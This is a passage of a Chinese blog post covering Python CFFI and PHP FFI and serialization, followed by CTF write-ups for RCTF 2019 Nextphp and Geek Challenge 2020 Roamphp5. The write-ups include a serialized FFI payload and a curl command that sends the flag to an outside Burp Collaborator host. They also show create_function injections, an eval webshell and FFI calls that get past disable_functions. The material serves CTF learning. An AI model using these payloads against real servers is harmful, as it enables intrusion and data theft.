</span></span><span style=display:flex><span>    <span style=color:#111>libraries</span><span style=color:#f92672>=</span><span style=color:#111>[</span><span style=color:#d88200>&#34;c&#34;</span><span style=color:#111>],</span>
</span></span><span style=display:flex><span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>with</span> <span style=color:#111>open</span><span style=color:#111>(</span><span style=color:#111>os</span><span style=color:#f92672>.</span><span style=color:#111>path</span><span style=color:#f92672>.</span><span style=color:#111>join</span><span style=color:#111>(</span><span style=color:#111>os</span><span style=color:#f92672>.</span><span style=color:#111>path</span><span style=color:#f92672>.</span><span style=color:#111>dirname</span><span style=color:#111>(</span><span style=color:#111>__file__</span><span style=color:#111>),</span> <span style=color:#d88200>&#34;fnmatch.h&#34;</span><span style=color:#111>))</span> <span style=color:#00a8c8>as</span> <span style=color:#111>f</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>    <span style=color:#111>ffi</span><span style=color:#f92672>.</span><span style=color:#111>cdef</span><span style=color:#111>(</span><span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#111>read</span><span style=color:#111>())</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>if</span> <span style=color:#111>__name__</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#34;__main__&#34;</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>    <span style=color:#111>ffi</span><span style=color:#f92672>.</span><span style=color:#111>compile</span><span style=color:#111>()</span>
</span></span></code></pre></div><p>一个<a href=https://github.dev/wolever/python-cffi-example/blob/ec14da61ee0de770750ff3781b412a3b25f020eb/setup.py#L1-L33>setup.py</a></p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>os</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>sys</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> <span style=color:#111>setuptools</span> <span style=color:#f92672>import</span> <span style=color:#111>setup</span><span style=color:#111>,</span> <span style=color:#111>find_packages</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>os</span><span style=color:#f92672>.</span><span style=color:#111>chdir</span><span style=color:#111>(</span><span style=color:#111>os</span><span style=color:#f92672>.</span><span style=color:#111>path</span><span style=color:#f92672>.</span><span style=color:#111>dirname</span><span style=color:#111>(</span><span style=color:#111>sys</span><span style=color:#f92672>.</span><span style=color:#111>argv</span><span style=color:#111>[</span><span style=color:#ae81ff>0</span><span style=color:#111>])</span> <span style=color:#f92672>or</span> <span style=color:#d88200>&#34;.&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>setup</span><span style=color:#111>(</span>
</span></span><span style=display:flex><span>    <span style=color:#111>name</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;cffi-example&#34;</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>    <span style=color:#111>version</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;0.1&#34;</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>    <span style=color:#111>classifiers</span><span style=color:#f92672>=</span><span style=color:#111>[</span>
</span></span><span style=display:flex><span>        <span style=color:#d88200>&#34;Development Status :: 4 - Beta&#34;</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>        <span style=color:#d88200>&#34;Programming Language :: Python :: 2&#34;</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>        <span style=color:#d88200>&#34;Programming Language :: Python :: 3&#34;</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>        <span style=color:#d88200>&#34;Programming Language :: Python :: Implementation :: PyPy&#34;</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>        <span style=color:#d88200>&#34;License :: OSI Approved :: BSD License&#34;</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>    <span style=color:#111>],</span>
</span></span><span style=display:flex><span>    <span style=color:#111>packages</span><span style=color:#f92672>=</span><span style=color:#111>find_packages</span><span style=color:#111>(),</span>
</span></span><span style=display:flex><span>    <span style=color:#111>install_requires</span><span style=color:#f92672>=</span><span style=color:#111>[</span><span style=color:#d88200>&#34;cffi&gt;=1.0.0&#34;</span><span style=color:#111>],</span>
</span></span><span style=display:flex><span>    <span style=color:#111>setup_requires</span><span style=color:#f92672>=</span><span style=color:#111>[</span><span style=color:#d88200>&#34;cffi&gt;=1.0.0&#34;</span><span style=color:#111>],</span>
</span></span><span style=display:flex><span>    <span style=color:#111>cffi_modules</span><span style=color:#f92672>=</span><span style=color:#111>[</span>
</span></span><span style=display:flex><span>        <span style=color:#d88200>&#34;./build_fnmatch.py:ffi&#34;</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>    <span style=color:#111>],</span>
</span></span><span style=display:flex><span><span style=color:#111>)</span>
</span></span></code></pre></div><p>最后的cffi_modules指定了需要生成ffi实例的文件</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>pyhon setup.py install
</span></span></code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202190508189.png alt=image-20211202190508189></p><p>没想到是个报错，仔细看一下原因，解决方法是把之前的fnmatch.h中的偏移换成16进制</p><p>再次执行就好了</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202190825764.png alt=image-20211202190825764></p><p>可以看到这种方式比之前生成的文件都要多，相当于安装了一个模块</p><p>然后是一个test_fnmatch.py，注意这里直接用给出的文件还是会报错，把下图高亮的地方换成0x1</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202191447689.png alt=image-20211202191447689></p><p>再执行就好了</p><p>cffi和ctypes还有很多的花活，鉴于我的代码能力一般（c和python都是勉强够用的水平），就不班门弄斧了，更多的东西还是看官方文档比较靠谱（链接贴在最后了</p><p>————什么？为什么FFI in PHP介绍的还不如FFI in Python的多？</p><p>emmmmm 这个嘛 才不会说是因为懒呢</p><h2 id=serializable>Serializable</h2><ul><li><a href=https://wiki.php.net/rfc/custom_object_serialization>PHP RFC: New custom object serialization mechanism</a> | php7.4启用</li></ul><p>已有的反序列化魔术方法总是有很多安全问题，这个提议新增了<code>__serialize()</code>，<code>__unserialize()</code>，<code>serialize()</code>，<code>unserialize()</code>和<code>Serializable()</code></p><p><code>serialize()</code>检查到<code>__serialize()</code>的存在后将在序列化之前优先执行，返回序列化形式的数组，如有错抛出TypeError；如果同时有<code>__serialize()</code>和<code>__sleep()</code>，后者将被忽略；如果对象实现了<code>Serializable()</code>接口，接口的<code>serialize()</code>将被忽略，类中的<code>__serialize()</code>将被调用；反序列化时触发<code>__unserialize()</code></p><p>————好勾八复杂的，建议直接看文档</p><h2 id=rctf-2019nextphp>[RCTF 2019]Nextphp</h2><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#75af00>php</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>final</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>A</span> <span style=color:#00a8c8>implements</span> <span style=color:#75af00>Serializable</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>protected</span> <span style=color:#111>$data</span> <span style=color:#f92672>=</span> <span style=color:#111>[</span>
</span></span><span style=display:flex><span>        <span style=color:#d88200>&#39;ret&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#00a8c8>null</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>        <span style=color:#d88200>&#39;func&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#d88200>&#39;print_r&#39;</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>        <span style=color:#d88200>&#39;arg&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#d88200>&#39;1&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>];</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>private</span> <span style=color:#00a8c8>function</span> <span style=color:#75af00>run</span> <span style=color:#111>()</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>data</span><span style=color:#111>[</span><span style=color:#d88200>&#39;ret&#39;</span><span style=color:#111>]</span> <span style=color:#f92672>=</span> <span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>data</span><span style=color:#111>[</span><span style=color:#d88200>&#39;func&#39;</span><span style=color:#111>](</span><span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>data</span><span style=color:#111>[</span><span style=color:#d88200>&#39;arg&#39;</span><span style=color:#111>]);</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>function</span> <span style=color:#75af00>__serialize</span><span style=color:#111>()</span><span style=color:#f92672>:</span> <span style=color:#00a8c8>array</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>data</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>function</span> <span style=color:#75af00>__unserialize</span><span style=color:#111>(</span><span style=color:#00a8c8>array</span> <span style=color:#111>$data</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>array_merge</span><span style=color:#111>(</span><span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>data</span><span style=color:#111>,</span> <span style=color:#111>$data</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>run</span><span style=color:#111>();</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>function</span> <span style=color:#75af00>serialize</span> <span style=color:#111>()</span><span style=color:#f92672>:</span> <span style=color:#75af00>string</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#75af00>serialize</span><span style=color:#111>(</span><span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>data</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>function</span> <span style=color:#75af00>unserialize</span><span style=color:#111>(</span><span style=color:#111>$payload</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>data</span> <span style=color:#f92672>=</span> <span style=color:#75af00>unserialize</span><span style=color:#111>(</span><span style=color:#111>$payload</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>run</span><span style=color:#111>();</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>function</span> <span style=color:#111>__get</span> <span style=color:#111>(</span><span style=color:#111>$key</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>data</span><span style=color:#111>[</span><span style=color:#111>$key</span><span style=color:#111>];</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>function</span> <span style=color:#111>__set</span> <span style=color:#111>(</span><span style=color:#111>$key</span><span style=color:#111>,</span> <span style=color:#111>$value</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>throw</span> <span style=color:#00a8c8>new</span> <span style=color:#75af00>\Exception</span><span style=color:#111>(</span><span style=color:#d88200>&#39;No implemented&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>function</span> <span style=color:#111>__construct</span> <span style=color:#111>()</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>throw</span> <span style=color:#00a8c8>new</span> <span style=color:#75af00>\Exception</span><span style=color:#111>(</span><span style=color:#d88200>&#39;No implemented&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span></code></pre></div><p>如果熟读以上三个文档，这个题就很好出了</p><p>我们可以把func设为<code>FFI:cdef</code>，arg设为<code>int system(char *command)</code>来执行c代码绕过php.ini中的限制；同时由于Serializable的种种新特性（出题人也在这里设了坑），我们在构造poc时要删除<code>__serialize()</code>，防止直接return进坑里了</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#75af00>php</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>final</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>A</span> <span style=color:#00a8c8>implements</span> <span style=color:#75af00>Serializable</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>protected</span> <span style=color:#111>$data</span> <span style=color:#f92672>=</span> <span style=color:#111>[</span>
</span></span><span style=display:flex><span>        <span style=color:#d88200>&#39;ret&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#00a8c8>null</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>        <span style=color:#d88200>&#39;func&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#d88200>&#39;FFI::cdef&#39;</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>        <span style=color:#d88200>&#39;arg&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#d88200>&#39;int system(char *command);&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>];</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>private</span> <span style=color:#00a8c8>function</span> <span style=color:#75af00>run</span> <span style=color:#111>()</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>data</span><span style=color:#111>[</span><span style=color:#d88200>&#39;ret&#39;</span><span style=color:#111>]</span> <span style=color:#f92672>=</span> <span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>data</span><span style=color:#111>[</span><span style=color:#d88200>&#39;func&#39;</span><span style=color:#111>](</span><span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>data</span><span style=color:#111>[</span><span style=color:#d88200>&#39;arg&#39;</span><span style=color:#111>]);</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>function</span> <span style=color:#75af00>serialize</span> <span style=color:#111>()</span><span style=color:#f92672>:</span> <span style=color:#75af00>string</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#75af00>serialize</span><span style=color:#111>(</span><span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>data</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>function</span> <span style=color:#75af00>__unserialize</span><span style=color:#111>(</span><span style=color:#00a8c8>array</span> <span style=color:#111>$data</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>array_merge</span><span style=color:#111>(</span><span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>data</span><span style=color:#111>,</span> <span style=color:#111>$data</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>run</span><span style=color:#111>();</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>function</span> <span style=color:#75af00>unserialize</span><span style=color:#111>(</span><span style=color:#111>$payload</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>data</span> <span style=color:#f92672>=</span> <span style=color:#75af00>unserialize</span><span style=color:#111>(</span><span style=color:#111>$payload</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>run</span><span style=color:#111>();</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>function</span> <span style=color:#111>__get</span> <span style=color:#111>(</span><span style=color:#111>$key</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>data</span><span style=color:#111>[</span><span style=color:#111>$key</span><span style=color:#111>];</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>function</span> <span style=color:#111>__set</span> <span style=color:#111>(</span><span style=color:#111>$key</span><span style=color:#111>,</span> <span style=color:#111>$value</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>throw</span> <span style=color:#00a8c8>new</span> <span style=color:#75af00>\Exception</span><span style=color:#111>(</span><span style=color:#d88200>&#39;No implemented&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>function</span> <span style=color:#111>__construct</span> <span style=color:#111>()</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>echo</span> <span style=color:#d88200>&#39;start&#39;</span><span style=color:#f92672>.</span><span style=color:#d88200>&#39;&lt;/br&gt;&#39;</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>$a</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#75af00>A</span><span style=color:#111>();</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>echo</span> <span style=color:#75af00>base64_encode</span><span style=color:#111>(</span><span style=color:#75af00>serialize</span><span style=color:#111>(</span><span style=color:#111>$a</span><span style=color:#111>));</span>
</span></span></code></pre></div><p>随后在传入的地方执行<code>unserialize(base64_decode(payload))->__serialize()['ret']->system(command);</code>，直接curl外带flag</p><pre tabindex=0><code>?a=unserialize(base64_decode(QzoxOiJBIjo4OTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czoyNjoiaW50IHN5c3RlbShjaGFyICpjb21tYW5kKTsiO319))-&gt;__serialize()[&#39;ret&#39;]-&gt;system(&#34;curl -d @/flag http://fm56ifsleqz363dh864mlhvtzk5atz.burpcollaborator.net&#34;);
</code></pre><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202223140032.png alt=image-20211202223140032></p><p>————在这个题出现之后蚁剑还专门出了对应的插件</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202223257130.png alt=image-20211202223257130></p><p>但是多次尝试失败，之后看到了这个<a href=https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp>wp</a>之后再看<a href=https://wiki.php.net/rfc/ffi>官方文档</a>还有<a href=https://www.laruence.com/2020/03/11/5475.html>这一篇</a>就明白了</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202223422195.png alt=image-20211202223422195></p><p>默认情况下FFI只会被用于CLI模式下&预加载php脚本，除非设置<code>ffi.enable=true</code>，设置之后在webshell就可以直接用蚁剑插件了</p><h3 id=极客大挑战-2020roamphp5-fighterfightsinvincibly>[极客大挑战 2020]Roamphp5-FighterFightsInvincibly</h3><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204173057497.png alt=image-20211204173057497></p><p>很漂亮的前端，看页面源码有注释的提示</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204173130852.png alt=image-20211204173130852></p><p>这个形式，真的是一眼<code>create_function()</code>了，看一下phpinfo()，用的还是<code>create_function()</code>的注入</p><pre tabindex=0><code>?fighter=create_function&amp;fights=&amp;invincibly=;}phpinfo();/*
</code></pre><p>看下disable_function</p><pre tabindex=0><code>system,exec,shell_exec,passthru,proc_open,proc_close,&amp;nbsp;proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport,&amp;nbsp;syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept,&amp;nbsp;socket_connect,&amp;nbsp;stream_socket_server,&amp;nbsp;stream_socket_accept,stream_socket_client,ftp_connect,&amp;nbsp;ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space,&amp;nbsp;disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd,&amp;nbsp;posix_getegid,posix_geteuid,posix_getgid,&amp;nbsp;posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,&amp;nbsp;posix_getppid,posix_getpwnam,posix_getpwuid,&amp;nbsp;posix_getrlimit,&amp;nbsp;posix_getsid,posix_getuid,posix_isatty,&amp;nbsp;posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid,&amp;nbsp;posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname&lt;/td&gt;&lt;td class=&#34;v&#34;&gt;system,exec,shell_exec,passthru,proc_open,proc_close,&amp;nbsp;proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport,&amp;nbsp;syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept,&amp;nbsp;socket_connect,&amp;nbsp;stream_socket_server,&amp;nbsp;stream_socket_accept,stream_socket_client,ftp_connect,&amp;nbsp;ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space,&amp;nbsp;disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd,&amp;nbsp;posix_getegid,posix_geteuid,posix_getgid,&amp;nbsp;posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,&amp;nbsp;posix_getppid,posix_getpwnam,posix_getpwuid,&amp;nbsp;posix_getrlimit,&amp;nbsp;posix_getsid,posix_getuid,posix_isatty,&amp;nbsp;posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid,&amp;nbsp;posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname
</code></pre><p>直接不用看了，有一吨，肯定得绕过；蚁剑的各种插件都失败，得手动绕，ffi扩展开着</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204174245283.png alt=image-20211204174245283></p><p>看到这里<code>ffi.enable=On</code>，符合蚁剑插件的应用条件，写个webshell试试</p><pre tabindex=0><code>?fighter=create_function&amp;fights=&amp;invincibly=;}eval($_POST[wuhu]);/*
</code></pre><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204175626714.png alt=image-20211204175626714></p><p>what&rsquo;s up，竟然没有回显</p><p>尝试ping，发现还不出网，不能用curl外带flag</p><p>那只能从FFI本身下手了，调用c的popen 用管道读命令执行的结果</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#111>FILE</span> <span style=color:#f92672>*</span><span style=color:#75af00>popen</span><span style=color:#111>(</span><span style=color:#00a8c8>const</span> <span style=color:#00a8c8>char</span><span style=color:#f92672>*</span> <span style=color:#111>command</span><span style=color:#111>,</span><span style=color:#00a8c8>const</span> <span style=color:#00a8c8>char</span><span style=color:#f92672>*</span> <span style=color:#111>type</span><span style=color:#111>);</span>
</span></span></code></pre></div><p><code>popen</code>会调用<code>fork()</code>产生子进程，然后从子进程中调用<code>/bin/sh -c</code>来执行参数的命令，type有r(read)和w(write)，依照这个值<code>popen</code>会建立管道连接到子进程的标准输出设备或写入到子进程的标准输入设备中</p><pre tabindex=0><code>?fighter=create_function&amp;fights=&amp;invincibly=;}$ffi = FFI::cdef(&#34;void *popen(char*,char*);void pclose(void*);int fgetc(void*);&#34;,&#34;libc.so.6&#34;);$o = $ffi-&gt;popen(&#34;ls / -lah&#34;,&#34;r&#34;);$d = &#34;&#34;;while(($c = $ffi-&gt;fgetc($o)) != -1){$d .= str_pad(strval(dechex($c)),2,&#34;0&#34;,0);}$ffi-&gt;pclose($o);echo hex2bin($d);/*
</code></pre><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204180626497.png alt=image-20211204180626497></p><p>另一种方法是调用php源码中的函数<code>php_exec()</code>，当它的参数type为3时对应调用的是<code>passthru()</code>函数，其执行命令可以将结果原始输出</p><pre tabindex=0><code>?fighter=create_function&amp;fights=&amp;invincibly=;}$ffi = FFI::cdef(&#34;int php_exec(int type, char *cmd);&#34;);$ffi-&gt;php_exec(3,&#34;ls /&#34;);/*
</code></pre><p>但是，这道题在buu复现不了，原因是uuid有32个字符，加上连字符有36位，再加上flag{}有42位，但是/readflag程序只允许读出37个字符，所以最后的5位是读不出来的（辣个唯一解可能是爆破的 我试着爆了一会 加延时得跑好久好久好久 放弃了</p><hr><p>最近在刷buuoj，有望这个月内把50解以上的题做完捏</p><hr><details><summary><h4 class=inline>以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（</h4></summary><p><a href=https://wiki.php.net/rfc/preload>PHP RFC: Preloading</a> | <a href=https://wiki.php.net/rfc/ffi>PHP RFC: FFI - Foreign Function Interface</a> | <a href=https://wiki.php.net/rfc/custom_object_serialization>PHP RFC: New custom object serialization mechanism</a> | <a href=https://www.laruence.com/2020/03/11/5475.html>PHP FFI详解 - 一种全新的PHP扩展方式</a></p><p><a href=https://towardsdatascience.com/do-you-hate-how-slow-python-is-this-is-how-you-can-make-it-run-faster-532468fe1583>Do You Hate How Slow Python Is? This Is How You Can Make It Run Faster!</a> | <a href=https://towardsdatascience.com/make-python-faster-with-cffi-python-bindings-eb5402bc35dd>Make Python Faster with CFFI Python Bindings</a></p><p><a href=https://cffi.readthedocs.io/en/latest/>CFFI documentation</a> | <a href=https://docs.python.org/3/library/ctypes.html>ctypes documentation</a></p><p><a href=https://www.cnblogs.com/ccxikka/p/9637545.html>Python cffi学习</a> | <a href=https://github.com/wolever/python-cffi-example>cffi-example: an example project showing how to use Python&rsquo;s CFFI</a></p><p><a href=https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp>wp</a> | <a href=http://www.lshhaisheng.com/2021/08/02/%E7%BB%95%E8%BF%87disable_function/>wp2</a></p></details></div></section></article></main><div class="w-full h-0 flex-none order-3"></div><aside role=contentinfo class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-4 md:order-3 md:sticky md:bottom-0 self-end max-w-2xl"><div class="md:float-right md:text-right leading-loose tracking-tight md:mb-2"><div class="md:max-w-xs flex flex-col md:items-end"><ul class="font-serif flex-grow-0 flex justify-between flex-wrap md:flex-col"><li class="px-1 md:px-0"><a href=/posts/ title="Posts page">Posts</a></li><li class="px-1 md:px-0"><a href=/life/ title="Fxxking life page">Fxxking life</a></li><li class="px-1 md:px-0"><a 